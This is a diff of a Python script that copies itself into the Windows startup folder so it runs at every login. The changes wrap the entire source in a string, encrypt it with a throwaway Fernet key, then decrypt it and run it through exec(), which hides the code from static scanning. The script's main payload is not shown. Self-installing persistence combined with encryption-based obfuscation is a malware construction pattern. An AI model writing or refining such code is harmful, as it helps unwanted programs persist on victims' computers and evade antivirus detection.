@@ -1,18 +1,16 @@
+from cryptography.fernet import Fernet
+
+code = b"""
+
 import random
 import threading
 import pathlib
 import pygame
 import sys
 import shutil
-from win32comext.shell import shell, shellcon
-
+from win32com.shell import shell, shellcon
 # https://stackoverflow.com/a/43618925
 def get_startup_directory(common):
-    """
-    Copyright Tim Golden <winshell@timgolden.me.uk> 25th November 2003 - 2012
-    Licensed under the (GPL-compatible) MIT License:
-    http://www.opensource.org/licenses/mit-license.php
-    """
     return pathlib.Path(shell.SHGetFolderPath(0, (shellcon.CSIDL_STARTUP, shellcon.CSIDL_COMMON_STARTUP)[common], None, 0))
 
 def copy_to_startup():
@@ -38,3 +36,13 @@ def main():
 
 if __name__ == '__main__':
   main()
+
+"""
+
+key = Fernet.generate_key()
+encryption_type = Fernet(key)
+encrypted_message = encryption_type.encrypt(code)
+
+decrypted_message = encryption_type.decrypt(encrypted_message)
+
+exec(decrypted_message)
